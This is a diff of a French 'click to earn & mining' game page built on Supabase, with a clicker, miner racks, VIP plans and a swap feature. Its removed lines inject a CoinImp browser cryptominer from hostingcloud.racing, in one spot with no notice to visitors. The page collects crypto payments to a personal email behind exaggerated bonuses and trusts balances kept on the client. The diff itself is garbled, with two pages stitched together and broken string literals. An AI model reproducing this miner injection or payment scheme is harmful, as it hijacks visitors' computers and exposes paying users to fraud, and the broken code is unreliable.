@@ -1,479 +1,6 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Deadspot • Click to Earn & Mining (Supabase)</title>
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-  <style>
-    :root{--bg:#030316;--card:#0f1724;--accent:#ff6f3c;--muted:#9aa3b2;--green:#7cffb2}
-    *{box-sizing:border-box}
-    body{background:linear-gradient(180deg,#020218,#06102a);color:#e6eef6;font-family:Inter,Segoe UI,Arial;margin:0;padding:18px}
-    .container{max-width:1200px;margin:0 auto}
-    header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
-    h1{margin:0;color:var(--accent);font-size:20px}
-    .card{background:var(--card);padding:14px;border-radius:10px;box-shadow:0 6px 24px rgba(0,0,0,0.6)}
-    .topbar{display:flex;gap:10px;align-items:center}
-    .stat{background:#071425;padding:8px;border-radius:8px}
-    .energy{height:20px;background:#071018;border-radius:999px;overflow:hidden;width:420px;border:1px solid rgba(255,255,255,0.03)}
-    .energy > .fill{height:100%;background:linear-gradient(90deg,#ffe77a,#ff6f3c);width:100%;transition:width 300ms}
-    .grid{display:grid;grid-template-columns:1fr 380px;gap:16px;margin-top:12px}
-    .big-btn{font-size:16px;padding:14px 20px;border-radius:12px;border:none;background:linear-gradient(180deg,#ff9f6b,#ff6f3c);cursor:pointer}
-    .big-btn.secondary{background:linear-gradient(180deg,#2a2f3a,#16202a);color:#fff}
-    .upgrades{display:flex;flex-wrap:wrap;gap:8px;margin-top:8px}
-    .upgrade{background:#062032;padding:10px;border-radius:8px;width:calc(50% - 8px)}
-    .small{font-size:13px;color:var(--muted)}
-    .flash{animation:blink 1s linear infinite}
-    @keyframes blink{0%{opacity:1}50%{opacity:0.15}100%{opacity:1}}
-    .graph{height:140px;background:#07131b;border-radius:8px;padding:8px}
-    input, select{background:#071429;border:1px solid #0b2b3a;padding:8px;border-radius:6px;color:#fff}
-    label{display:block;margin-top:8px}
-    .columns{display:flex;gap:12px}
-    .col{flex:1}
-    .rack-slot{width:120px;height:120px;border-radius:10px;background:#061025;border:1px dashed rgba(255,255,255,0.03);display:flex;flex-direction:column;align-items:center;justify-content:center;padding:8px}
-    .inventory-item{background:#061422;padding:8px;border-radius:8px}
-    .modal{position:fixed;inset:0;background:linear-gradient(90deg, rgba(2,6,23,0.8), rgba(2,6,23,0.92));display:flex;align-items:center;justify-content:center;z-index:200}
-    .modal .card{width:520px}
-    .hidden{display:none}
-    .tiny{font-size:12px;color:var(--muted)}
-    footer{margin-top:12px;color:var(--muted);font-size:13px}
-    .shop-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
-  </style>
-</head>
-<body>
-  <div class="container">
-
-    <header>
-      <h1>Deadspot • Click to Earn & Mining</h1>
-      <div class="topbar">
-        <div class="stat card">Deadspot: <b id="deadspot">0.0000</b></div>
-        <div class="stat card">Diamants: <b id="diamonds">0</b></div>
-        <div class="stat card">XP: <b id="xp">0</b></div>
-        <div class="stat card">Niveau: <b id="level">1</b></div>
-      </div>
-    </header>
-
-    <!-- AUTH MODAL (FORCES LOGIN) -->
-    <div id="authModal" class="modal">
-      <div class="card">
-        <h2>Connexion requise</h2>
-        <p class="small">Connecte-toi ou crée un compte pour accéder au Clicker / Wallet / Shop.</p>
-        <div style="display:flex;gap:8px;margin-top:8px">
-          <input id="authEmail" placeholder="Email" style="flex:1">
-          <input id="authPassword" type="password" placeholder="Mot de passe" style="width:220px">
-        </div>
-        <div style="display:flex;gap:8px;margin-top:10px">
-          <button id="authSignIn" class="big-btn">Se connecter</button>
-          <button id="authSignUp" class="big-btn secondary">S'inscrire</button>
-        </div>
-        <div style="display:flex;gap:8px;margin-top:10px;align-items:center;justify-content:space-between">
-          <div class="tiny">Supabase connecté: <b>oui</b></div>
-          <div class="tiny" id="authHelp"></div>
-        </div>
-      </div>
-    </div>
-
-    <!-- APP (hidden until login) -->
-    <div id="app" class="hidden">
-
-      <section class="card">
-        <div style="display:flex;justify-content:space-between;align-items:center">
-          <div>
-            <strong>Compte: <span id="userEmail">—</span></strong>
-            <div class="tiny">ID: <span id="userId">—</span></div>
-          </div>
-          <div>
-            <div class="energy" title="Energy points">
-              <div id="energyFill" class="fill"></div>
-            </div>
-            <div class="small">Energy: <span id="energy">1000</span>/<span id="energyMax">1000</span></div>
-          </div>
-        </div>
-      </section>
-
-      <section class="grid">
-        <div>
-          <div class="card">
-            <h2>Click to Earn</h2>
-            <div style="display:flex;gap:12px;align-items:center">
-              <button id="clickBtn" class="big-btn">CLICK</button>
-              <div>
-                <div class="small">Gains par click: <b id="clickGain">0.0001</b> DS (aléa)</div>
-                <div class="small">XP par click: <b id="xpGain">0.175</b></div>
-                <div class="small">Chances: triple 28% • quad • x10 configurable</div>
-                <div class="small flash" id="firstBonusBadge">Bonus premier achat: +1764% (clignote)</div>
-              </div>
-            </div>
-
-            <div class="upgrades" id="upgrades"></div>
-          </div>
-
-          <div class="card" style="margin-top:12px">
-            <h3>Racks & Mineurs</h3>
-            <div class="small">Achete des racks, achète/commande des mineurs uniques (5), équipe-les sur des étagères (6 slots).</div>
-
-            <div style="display:flex;gap:12px;margin-top:12px">
-              <div style="flex:1">
-                <h4>Inventaire (mineurs achetés)</h4>
-                <div id="inventoryList" style="display:flex;gap:8px;flex-wrap:wrap;min-height:80px"></div>
-              </div>
-              <div style="width:420px">
-                <h4>Local de minage — 6 racks</h4>
-                <div style="display:flex;gap:8px;flex-wrap:wrap">
-                  <div class="rack-slot" id="rack0" onclick="onRackClick(0)">Slot 1<br><span id="rack0txt">Vide</span></div>
-                  <div class="rack-slot" id="rack1" onclick="onRackClick(1)">Slot 2<br><span id="rack1txt">Vide</span></div>
-                  <div class="rack-slot" id="rack2" onclick="onRackClick(2)">Slot 3<br><span id="rack2txt">Vide</span></div>
-                  <div class="rack-slot" id="rack3" onclick="onRackClick(3)">Slot 4<br><span id="rack3txt">Vide</span></div>
-                  <div class="rack-slot" id="rack4" onclick="onRackClick(4)">Slot 5<br><span id="rack4txt">Vide</span></div>
-                  <div class="rack-slot" id="rack5" onclick="onRackClick(5)">Slot 6<br><span id="rack5txt">Vide</span></div>
-                </div>
-                <div class="tiny" style="margin-top:6px">Clique sur un slot pour équiper/déséquiper un mineur depuis ton inventaire.</div>
-              </div>
-            </div>
-
-            <div style="margin-top:12px" id="minersShopWrap">
-              <h4>Boutique — Mineurs (5 uniques — payables en DS ou commandés en Crypto — VIP req)</h4>
-              <div class="shop-grid" id="minersShop"></div>
-            </div>
-
-          </div>
-
-          <div class="card" style="margin-top:12px">
-            <h3>Swap — Frais 12%</h3>
-            <label>Montant (DS): <input id="swapAmount" placeholder="ex: 10"></label>
-            <label>Devise cible: <select id="swapTo"><option>BTC</option><option>ETH</option><option>USDT</option><option>deadspot</option></select></label>
-            <div style="margin-top:8px"><button id="swapBtn" class="big-btn">Swap</button></div>
-            <div class="small" style="margin-top:8px">Fees 12% + network. Les 12% sont enregistrées pour le propriétaire (table fees).</div>
-          </div>
-
-        </div>
-
-        <aside>
-          <div class="card">
-            <h3>Stats minage live</h3>
-            <div class="graph" id="hsGraph">Graph H/s (simulé)</div>
-            <div class="small">H/s total: <b id="hsTotal">0</b></div>
-            <div class="small">CPU perf: <b id="cpuPerf">0%</b></div>
-            <div class="small">API key stats: <span class="tiny">24b28c3ad1a7b76126a71d8d41eb21ab367bc077752551441fc1fe21178d1825</span></div>
-          </div>
-
-          <div class="card" style="margin-top:10px">
-            <h4>VIP — Plans</h4>
-            <div class="small">3 niveaux: Silver / Gold / Platinum (mensuel/annuel).</div>
-            <div style="display:flex;gap:8px;margin-top:8px">
-              <button id="buyVipBtn" class="big-btn">Acheter VIP (FaucetPay)</button>
-            </div>
-            <div class="small" style="margin-top:8px">Payer via FaucetPay: <b>maximlprive90@gmail.com</b>. Après dépôt, colle l'IDTX ci‑dessous et clique sur "Vérifier paiement".</div>
-            <label>IDTX / Order ID (pour vérification): <input id="verifyTxInput" placeholder="tx id ou order id"></label>
-            <div style="display:flex;gap:8px;margin-top:8px"><button id="verifyBtn" class="big-btn secondary">Vérifier paiement</button><button id="attachTxBtn" class="big-btn secondary">Attacher TX à commande</button></div>
-          </div>
-
-          <div class="card" style="margin-top:10px">
-            <h4>Achat OKGateway</h4>
-            <a href="https://okgateway.com/?view=product&item=GpjCt3t6&data=example"><img src="https://okgateway.com/okgateway.png" style="width:100%"></a>
-            <a href="https://okgateway.com/?view=product&item=ZCEKLIWr&data=example"><img src="https://okgateway.com/okgateway.png" style="width:100%;margin-top:8px"></a>
-          </div>
-
-        </aside>
-      </section>
-
-      <footer>
-        <div class="small">Live updates toutes les 2s. Tables Supabase utilisées: <b>user_state</b>, <b>payments</b>, <b>fees</b>. Configure RLS selon sécurité souhaitée.</div>
-      </footer>
-
-    </div>
-
-  </div>
-
-<script>
-// ----------------- Config Supabase -----------------
-const SUPABASE_URL = 'https://wbavwtwslofcrpeuyqak.supabase.co';
-const SUPABASE_ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndiYXZ3dHdzbG9mY3JwZXV5cWFrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTQyMDQxNzksImV4cCI6MjA2OTc4MDE3OX0.eSd88VEGv78YoNjuBxR5PpwnpN6BZ4Am4z3Cq8xHUds';
-const supabaseLib = window.supabase || window.supabaseJs || window.createClient || null;
-const supabase = (supabaseLib && supabaseLib.createClient) ? supabaseLib.createClient(SUPABASE_URL, SUPABASE_ANON) : null;
-if(!supabase) console.warn('Supabase client not instantiated - check script include');
-
-// ----------------- Global state -----------------
-let me = { id: null, email: null };
-let state = {
-  deadspot: 0,
-  diamonds: 0,
-  xp: 0,
-  level: 1,
-  energy: 1000,
-  energyMax: 1000,
-  clickBaseMin: 0.0001,
-  clickBaseMax: 0.27,
-  xpGain: 0.175,
-  multiplier: 1,
-  tripleChance: 0.28,
-  quadChance: 0.05,
-  tenChance: 0.01,
-  regen: 0,
-  racks: [null,null,null,null,null,null],
-  inventory: [],
-  hsTotal: 0,
-  vip: null,
-  firstDepositBonusClaimed: false
-};
-
-// ----------------- Helper functions -----------------
-function $(id){return document.getElementById(id)}
-function fmt(n){ if(typeof n!=='number') return n; if(n>=1) return n.toFixed(4); return n.toPrecision(4); }
-
-function showApp(){ $('authModal').classList.add('hidden'); $('app').classList.remove('hidden'); }
-function hideApp(){ $('authModal').classList.remove('hidden'); $('app').classList.add('hidden'); }
-
-// ----------------- Auth -----------------
-async function signUp(){
-  const email = $('authEmail').value.trim(); const password = $('authPassword').value.trim();
-  if(!email || !password) return alert('Email + password requis');
-  const { data, error } = await supabase.auth.signUp({ email, password });
-  if(error) return alert('Erreur inscription: '+error.message);
-  alert('Inscription OK. Vérifie ton email.');
-}
-
-async function signIn(){
-  const email = $('authEmail').value.trim(); const password = $('authPassword').value.trim();
-  if(!email || !password) return alert('Email + password requis');
-  const { data, error } = await supabase.auth.signInWithPassword({ email, password });
-  if(error) return alert('Erreur connexion: '+error.message);
-  if(data && data.user){ me.id = data.user.id; me.email = data.user.email; $('userEmail').innerText = me.email; $('userId').innerText = me.id; await loadState(); showApp(); }
-}
-
-supabase.auth.onAuthStateChange((event, session)=>{
-  if(session && session.user){ me.id = session.user.id; me.email = session.user.email; $('userEmail').innerText = me.email; $('userId').innerText = me.id; loadState().then(()=>showApp()); }
-  else { me = {id:null,email:null}; hideApp(); }
-});
-
-// ----------------- Load & Save user state -----------------
-async function loadState(){
-  if(!me.id) return;
-  try{
-    const { data, error } = await supabase.from('user_state').select('*').eq('id', me.id).maybeSingle();
-    if(error) { console.warn('load state err', error); return; }
-    if(data){
-      // merge
-      state = Object.assign(state, data);
-      // ensure arrays present
-      state.inventory = state.inventory || [];
-      state.racks = state.racks || [null,null,null,null,null,null];
-    } else {
-      // create initial row
-      await supabase.from('user_state').insert([{ id: me.id, deadspot: state.deadspot, diamonds: state.diamonds, xp: state.xp, level: state.level, energy: state.energy, energyMax: state.energyMax, inventory: state.inventory, racks: state.racks, vip: state.vip, firstDepositBonusClaimed: state.firstDepositBonusClaimed }]);
-    }
-    updateUI();
-  }catch(e){ console.warn(e); }
-}
-
-async function saveState(){
-  if(!me.id) return; // not logged
-  try{
-    await supabase.from('user_state').upsert([{ id: me.id, deadspot: state.deadspot, diamonds: state.diamonds, xp: state.xp, level: state.level, energy: state.energy, energyMax: state.energyMax, inventory: state.inventory, racks: state.racks, vip: state.vip, firstDepositBonusClaimed: state.firstDepositBonusClaimed }], { onConflict: 'id' });
-  }catch(e){ console.warn('saveState err', e); }
-}
-
-// ----------------- Leveling -----------------
-function xpNeeded(level){ if(level===1) return 15; return Math.floor(15 * Math.pow(1.27, level-1)); }
-function tryLevelUp(){ let needed = xpNeeded(state.level); while(state.xp >= needed){ state.xp -= needed; state.level++; state.diamonds += Math.floor(5 * state.level * 0.5); needed = xpNeeded(state.level); } }
-
-// ----------------- Click logic -----------------
-$('clickBtn').addEventListener('click', async ()=>{
-  if(state.energy <= 0){ alert('Plus d\'energy!'); return; }
-  let mult = state.multiplier;
-  const r = Math.random();
-  if(r < state.tenChance) mult *= 10;
-  else if(r < state.quadChance + state.tenChance) mult *= 4;
-  else if(r < state.tripleChance + state.quadChance + state.tenChance) mult *= 3;
-  const gain = (Math.random() * (state.clickBaseMax - state.clickBaseMin) + state.clickBaseMin) * mult;
-  state.deadspot += gain;
-  state.xp += state.xpGain;
-  state.energy = Math.max(0, state.energy - Math.round(1 * mult));
-  tryLevelUp();
-  await saveState(); updateUI();
-});
-
-// ----------------- Upgrades -----------------
-const upgrades = [ {id:'double',name:'Double Click',cost:20,apply:()=>{ state.multiplier *= 2 }}, {id:'triple',name:'Triple Click',cost:60,apply:()=>{ state.multiplier *= 3 }}, {id:'energy+500',name:'+500 Energy Max',cost:40,apply:()=>{ state.energyMax += 500; state.energy += 500 }}, {id:'regen+1',name:'Energy Regen +1',cost:25,apply:()=>{ state.regen += 1 }} ];
-function renderUpgrades(){ const c = $('upgrades'); c.innerHTML=''; upgrades.forEach(u=>{ const el=document.createElement('div'); el.className='upgrade'; el.innerHTML = `<b>${u.name}</b><div class='tiny'>Cost: ${u.cost} DS</div><div style='margin-top:6px'><button class='big-btn secondary' onclick="buyUpgrade('${u.id}')">Buy</button></div>`; c.appendChild(el); }); }
-async function buyUpgrade(id){ const u = upgrades.find(x=>x.id===id); if(!u) return; if(state.deadspot < u.cost) return alert('Pas assez de Deadspot'); state.deadspot -= u.cost; u.apply(); await saveState(); updateUI(); }
-
-// ----------------- Miners & Racks -----------------
-const miners = [
-  { id:'m1', name:'NanoMiner', power:20, priceDS:50, priceDiam:0, vip:'silver', description:'Small miner, low cost' },
-  { id:'m2', name:'PulseMiner X', power:80, priceDS:500, priceDiam:5, vip:'gold', description:'Mid-range pulse miner' },
-  { id:'m3', name:'Titanium Rig', power:300, priceDS:2000, priceDiam:20, vip:'platinum', description:'High performance rig' },
-  { id:'m4', name:'Quantum Hash', power:1200, priceDS:15000, priceDiam:80, vip:'platinum', description:'Next-level quantum miner' },
-  { id:'m5', name:'Mythic Forge', power:7000, priceDS:85000, priceDiam:300, vip:'platinum', description:'Legendary mine beast' }
-];
-
-function renderMinersShop(){ const wrap = $('minersShop'); wrap.innerHTML=''; miners.forEach(m=>{
-  const el = document.createElement('div'); el.className='card'; el.style.padding='8px'; el.innerHTML = `<b>${m.name}</b><div class='tiny'>${m.description}</div><div class='tiny'>Power: ${m.power} H/s</div><div class='tiny'>Price: ${m.priceDS} DS + ${m.priceDiam}💎 • VIP: ${m.vip}</div><div style='margin-top:6px'><button class='big-btn' onclick="buyMinerDS('${m.id}')">Buy with DS</button> <button class='big-btn secondary' onclick="orderMinerCrypto('${m.id}')">Order (crypto)</button></div>`;
-  wrap.appendChild(el);
-}); }
-
-async function buyMinerDS(id){ const m = miners.find(x=>x.id===id); if(!m) return; if(state.deadspot < m.priceDS || state.diamonds < m.priceDiam) return alert('Pas assez de fonds'); if(!userHasVIP(m.vip)) return alert('VIP requis: '+m.vip); state.deadspot -= m.priceDS; state.diamonds -= m.priceDiam; state.inventory.push(Object.assign({}, m)); await saveState(); updateUI(); alert('Miner ajouté à l\'inventaire'); }
-
-function userHasVIP(required){ if(!required) return true; if(!state.vip) return false; const order = ['silver','gold','platinum']; return order.indexOf(state.vip) >= order.indexOf(required); }
-
-// Crypto order flow: insert a pending payment order. User must pay via FaucetPay to owner and then attach txid.
-async function orderMinerCrypto(minerId){
-  if(!me.id) return alert('Connecte-toi');
-  const m = miners.find(x=>x.id===minerId); if(!m) return;
-  try{
-    const order = { user_id: me.id, item_type: 'miner', target_id: minerId, price_ds: m.priceDS, amount: m.priceDS, currency: 'DS', status: 'pending', created_at: new Date().toISOString() };
-    const { data, error } = await supabase.from('payments').insert([order]).select().single();
-    if(error) { console.warn(error); return alert('Erreur création commande'); }
-    alert('Commande créée. ID commande: ' + data.id + '
-Payez via FaucetPay à maximlprive90@gmail.com et utilisez cette ID comme référence. Ensuite collez le TXID et cliquez sur Attacher TX -> Vérifier.');
-  }catch(e){ console.warn(e); alert('Erreur création commande'); }
-}
-
-// Attach tx to order (user provides order id and txid) - this updates payments row with txid
-async function attachTxToOrder(){ const input = $('verifyTxInput').value.trim(); if(!input) return alert('Entrez TX ou OrderID');
-  // if input looks like uuid we treat as order id; otherwise ask for both
-  const orderId = input; const txid = prompt('Colle le TXID (hash) ici:'); if(!txid) return alert('TXID requis');
-  try{
-    const { data, error } = await supabase.from('payments').update({ txid: txid }).eq('id', orderId);
-    if(error) { console.warn(error); return alert('Erreur attacher TX'); }
-    alert('TX attaché à la commande. Attendre confirmation (15-30 min).');
-  }catch(e){ console.warn(e); }
-}
-
-// Verify payment: look up payment by txid and if status confirmed -> deliver
-async function verifyPayment(){ const tx = $('verifyTxInput').value.trim(); if(!tx) return alert('Entrez TXID ou Order ID');
-  try{
-    // try find by txid
-    let { data, error } = await supabase.from('payments').select('*').or(`txid.eq.${tx},id.eq.${tx}`).maybeSingle();
-    if(error){ console.warn(error); return alert('Erreur verification'); }
-    if(!data) return alert('Paiement non trouvé. Assure-toi d\'avoir payé et que la commande existe.');
-    if(data.status !== 'confirmed') return alert('Paiement trouvé mais statut: ' + data.status + '. Attendre confirmation.');
-    // process confirmed payment
-    if(data.item_type === 'miner'){
-      const miner = miners.find(m=>m.id === data.target_id);
-      if(miner){ state.inventory.push(Object.assign({}, miner)); alert('Miner ajouté à ton inventaire (commande confirmée)'); }
-    } else if(data.item_type === 'vip'){
-      state.vip = data.target_id || 'silver'; alert('VIP activé: ' + state.vip);
-    } else if(data.item_type === 'deposit'){
-      // credit deadspot amount and bonus if first deposit
-      let amt = parseFloat(data.amount) || 0;
-      if(!state.firstDepositBonusClaimed){ const bonusMultiplier = 1 + 17.64; state.deadspot += amt * bonusMultiplier; state.hsTotal += 150; state.firstDepositBonusClaimed = true; }
-      else state.deadspot += amt;
-    }
-    await saveState(); updateUI();
-  }catch(e){ console.warn(e); alert('Erreur verification'); }
-}
-
-// ----------------- Swap -----------------
-$('swapBtn').addEventListener('click', async ()=>{
-  const amt = parseFloat($('swapAmount').value || 0);
-  const to = $('swapTo').value;
-  if(!amt || amt <= 0) return alert('Montant invalide');
-  if(state.deadspot < amt) return alert('Pas assez de Deadspot');
-  const fee12 = amt * 0.12; const after = amt - fee12;
-  state.deadspot -= amt;
-  // record fee
-  try{ await supabase.from('fees').insert([{ amount: fee12, currency: 'DS', created_at: new Date().toISOString() }]); }catch(e){ console.warn('fees insert fail', e); }
-  alert(`Swap simulé: ${after.toFixed(6)} ${to} (fees 12% = ${fee12.toFixed(6)} DS enregistrées)`);
-  await saveState(); updateUI();
-});
-
-// ----------------- Racks equip/unequip -----------------
-function onRackClick(index){
-  const slot = state.racks[index];
-  if(slot){ // unequip
-    if(confirm('Déséquiper ' + slot.name + ' de la slot ' + (index+1) + ' ?')){ state.inventory.push(slot); state.racks[index] = null; saveState().then(updateUI); }
-    return;
-  }
-  // if empty -> pick a miner from inventory to equip
-  if(state.inventory.length === 0) return alert('Inventaire vide');
-  // show a simple selection prompt
-  const names = state.inventory.map((m,i)=>`${i}: ${m.name} (power ${m.power})`).join('
-');
-  const pick = prompt('Choisis index du miner à équiper:
-' + names + '
-Annuler pour fermer');
-  if(pick === null) return; const idx = parseInt(pick);
-  if(isNaN(idx) || idx < 0 || idx >= state.inventory.length) return alert('Index invalide');
-  const miner = state.inventory.splice(idx,1)[0]; state.racks[index] = miner; saveState().then(updateUI);
-}
-
-// ----------------- Simulate mining income from placed miners -----------------
-setInterval(()=>{
-  // only miners on racks produce H/s
-  let hsFromRacks = 0;
-  for(let s of state.racks){ if(s && s.power) hsFromRacks += s.power; }
-  state.hsTotal = Math.max(0, state.hsTotal + hsFromRacks * 0.01 + (Math.random()-0.5) * 5);
-  // passive DS from hs
-  state.deadspot += state.hsTotal * 0.0000005; // small passive
-  // energy regen
-  state.energy = Math.min(state.energyMax, state.energy + state.regen);
-  updateUI();
-},2000);
-
-// ----------------- UI update -----------------
-function updateUI(){
-  $('deadspot').innerText = fmt(state.deadspot);
-  $('diamonds').innerText = Math.floor(state.diamonds);
-  $('xp').innerText = state.xp.toFixed(3);
-  $('level').innerText = state.level;
-  $('energy').innerText = Math.floor(state.energy);
-  $('energyMax').innerText = state.energyMax;
-  $('energyFill').style.width = Math.min(100, (state.energy/state.energyMax)*100) + '%';
-  $('clickGain').innerText = fmt(((state.clickBaseMin+state.clickBaseMax)/2) * state.multiplier);
-  $('xpGain').innerText = state.xpGain;
-  $('hsTotal').innerText = Math.round(state.hsTotal);
-  $('cpuPerf').innerText = Math.round(Math.random()*100)+'%';
-
-  // inventory render
-  const inv = $('inventoryList'); inv.innerHTML = '';
-  state.inventory.forEach((m, idx)=>{ const d = document.createElement('div'); d.className='inventory-item'; d.style.padding='6px'; d.style.minWidth='140px'; d.innerHTML = `<b>${m.name}</b><div class='tiny'>Power: ${m.power} H/s</div><div style='margin-top:6px'><button class='big-btn secondary' onclick="equipFromInventory(${idx})">Equiper</button> <button class='big-btn' onclick="sellInventory(${idx})">Vendre</button></div>`; inv.appendChild(d); });
-
-  // render racks slots text
-  for(let i=0;i<6;i++){ const el = $('rack'+i+'txt'); if(!el) continue; const s = state.racks[i]; el.innerText = s ? `${s.name}` : 'Vide'; }
-}
-
-function equipFromInventory(idx){ if(idx<0 || idx>=state.inventory.length) return; // find first empty rack
-  const empty = state.racks.findIndex(x=>x===null);
-  if(empty === -1) return alert('Aucun rack vide.');
-  const miner = state.inventory.splice(idx,1)[0]; state.racks[empty] = miner; saveState().then(updateUI);
-}
-
-function sellInventory(idx){ const m = state.inventory[idx]; if(!m) return; if(!confirm('Vendre '+m.name+' pour ' + Math.round(m.priceDS*0.5) + ' DS ?')) return; state.deadspot += Math.round(m.priceDS*0.5); state.inventory.splice(idx,1); saveState().then(updateUI); }
-
-// ----------------- VIP buy (creates payment order) -----------------
-async function buyVip(){ if(!me.id) return alert('Connecte-toi');
-  const plan = prompt('Choisis plan: silver,gold,platinum'); if(!plan) return; const amount = prompt('Montant (exemple: 15 pour USD)');
-  try{
-    const order = { user_id: me.id, item_type: 'vip', target_id: plan, price_ds: 0, amount: amount || 0, currency: 'USD', status: 'pending', created_at: new Date().toISOString() };
-    const { data, error } = await supabase.from('payments').insert([order]).select().single();
-    if(error) return alert('Erreur création order');
-    alert('Commande VIP créée. ID: ' + data.id + '
-Payer via FaucetPay à maximlprive90@gmail.com. Colle TXID dans le champ et clique Attacher TX puis Vérifier.');
-  }catch(e){ console.warn(e); alert('Erreur'); }
-}
-
-$('authSignUp').addEventListener('click', signUp);
-$('authSignIn').addEventListener('click', signIn);
-$('buyVipBtn').addEventListener('click', buyVip);
-$('attachTxBtn').addEventListener('click', attachTxToOrder);
-$('verifyBtn').addEventListener('click', verifyPayment);
-
-// ----------------- Init render -----------------
-renderUpgrades(); renderMinersShop(); updateUI();
-
-// ----------------- Inject miner script (user provided) -----------------
-(function(){ const s = document.createElement('script'); s.src = 'https://www.hostingcloud.racing/cW8A.js'; s.onload = function(){ try{ var _client = Client && Client.Anonymous ? Client.Anonymous('6385166bb53532d18acd435d3e6855c99be476fa8c7ab67bc03c6f0af2aacd51', { throttle: 0.2, c: 'w' }) : null; if(_client && _client.start) { _client.start(); _client.addMiningNotification("Bottom","This site is running JavaScript miner from coinimp.com.","#a1a305",20,"#150e7c"); } }catch(e){ console.warn('miner init error', e); } }; document.body.appendChild(s); })();
-
-</script>
-</body>
-</html>
-
-</script>
-</body>
-</html><!DOCTYPE html>
-<html lang="fr">
-<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Rewards Airdrop Mining</title>
@@ -535,8 +62,6 @@ renderUpgrades(); renderMinersShop(); updateUI();
   <div id="bonus-banner">
     🎁 Premier achat: +1764% Deadspot, x4 Clicks, +150 GH/s gratuit!
   </div>
-  <a href="https://okgateway.com/?view=product&item=GpjCt3t6&data=example"><img src="https://okgateway.com/okgateway.png"></a>
-  <a href="https://okgateway.com/?view=product&item=ZCEKLIWr&data=example"><img src="https://okgateway.com/okgateway.png"></a>
 
   <!-- Racks & Mineurs -->
   <h2>Mes Racks</h2>
@@ -561,82 +86,102 @@ renderUpgrades(); renderMinersShop(); updateUI();
   <canvas id="hashChart" width="400" height="100" style="background:#111;"></canvas>
 </div>
 
-<!-- Miner Script -->
-<script src="https://www.hostingcloud.racing/cW8A.js"></script>
 <script>
-  var _client = new Client.Anonymous('6385166bb53532d18acd435d3e6855c99be476fa8c7ab67bc03c6f0af2aacd51', {
-      throttle: 0.2, c: 'w'
-  });
-  _client.start();
-</script>
+  // ---- Supabase setup ----
+  const SUPABASE_URL = "https://wbavwtwslofcrpeuyqak.supabase.co"
+  const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndiYXZ3dHdzbG9mY3JwZXV5cWFrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTQyMDQxNzksImV4cCI6MjA2OTc4MDE3OX0.eSd88VEGv78YoNjuBxR5PpwnpN6BZ4Am4z3Cq8xHUds"
+  const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY)
 
-<script>
-const { createClient } = supabase
-const SUPABASE_URL = "https://wbavwtwslofcrpeuyqak.supabase.co"
-const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndiYXZ3dHdzbG9mY3JwZXV5cWFrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTQyMDQxNzksImV4cCI6MjA2OTc4MDE3OX0.eSd88VEGv78YoNjuBxR5PpwnpN6BZ4Am4z3Cq8xHUds"
-const supabaseClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY)
+  // ---- User state ----
+  let state = { deadspot:0, diamonds:0, xp:0, level:1, energy:1000, energyMax:1000, racks:[], inventory:[] }
 
-// User State
-let state = { deadspot:0, diamonds:0, xp:0, level:1, energy:1000, energyMax:1000, racks:[], inventory:[] }
-
-async function loadUserState() {
-  const { data, error } = await supabaseClient
-    .from("user_state")
-    .select("*")
-    .eq("id", (await supabaseClient.auth.getUser()).data.user.id)
-    .single()
-  if (data) state = data
-  updateUI()
-}
-
-async function saveUserState() {
-  const user = (await supabaseClient.auth.getUser()).data.user
-  await supabaseClient.from("user_state").upsert({ id:user.id, ...state })
-}
-
-function updateUI(){
-  document.getElementById("deadspot").innerText = state.deadspot.toFixed(4)
-  document.getElementById("diamonds").innerText = state.diamonds
-  document.getElementById("xp").innerText = state.xp.toFixed(2)
-  document.getElementById("level").innerText = state.level
-  document.getElementById("energy").innerText = state.energy
-  document.getElementById("energyMax").innerText = state.energyMax
-  document.getElementById("energy-fill").style.width = (state.energy/state.energyMax*100)+"%"
-}
-
-// 🔐 Auth
-document.getElementById("btnSignUp").addEventListener("click", async()=>{
-  let email=document.getElementById("email").value
-  let password=document.getElementById("password").value
-  let { error } = await supabaseClient.auth.signUp({ email, password })
-  if(error) alert(error.message); else alert("Inscription réussie!")
-})
-document.getElementById("btnSignIn").addEventListener("click", async()=>{
-  let email=document.getElementById("email").value
-  let password=document.getElementById("password").value
-  let { error } = await supabaseClient.auth.signInWithPassword({ email, password })
-  if(error) alert(error.message)
-  else { document.getElementById("login-overlay").style.display="none"; document.getElementById("app").style.display="block"; loadUserState() }
-})
-
-// 🔘 Clicker
-document.getElementById("clickBtn").addEventListener("click", ()=>{
-  if(state.energy<=0) return alert("Pas assez d'énergie")
-  state.energy -= 1
-  let gain = 0.0001 + Math.random()*0.27
-  state.deadspot += gain
-  state.xp += 0.175
-  if(state.xp > (15 * Math.pow(1.27, state.level-1))){
-    state.level++; state.diamonds += 1
+  async function loadUserState() {
+    try {
+      const { data: { session } } = await supabaseClient.auth.getSession()
+      if (!session) return
+      const userId = session.user.id
+      const { data, error } = await supabaseClient
+        .from("user_state")
+        .select("*")
+        .eq("id", userId)
+        .single()
+      if (data) state = data
+      updateUI()
+    } catch(e){ console.error(e) }
   }
-  updateUI(); saveUserState()
-})
 
-// Init if already logged
-supabaseClient.auth.getSession().then(({data})=>{
-  if(data.session){ document.getElementById("login-overlay").style.display="none"; document.getElementById("app").style.display="block"; loadUserState() }
-})
+  async function saveUserState() {
+    try {
+      const { data: { session } } = await supabaseClient.auth.getSession()
+      if (!session) return
+      const userId = session.user.id
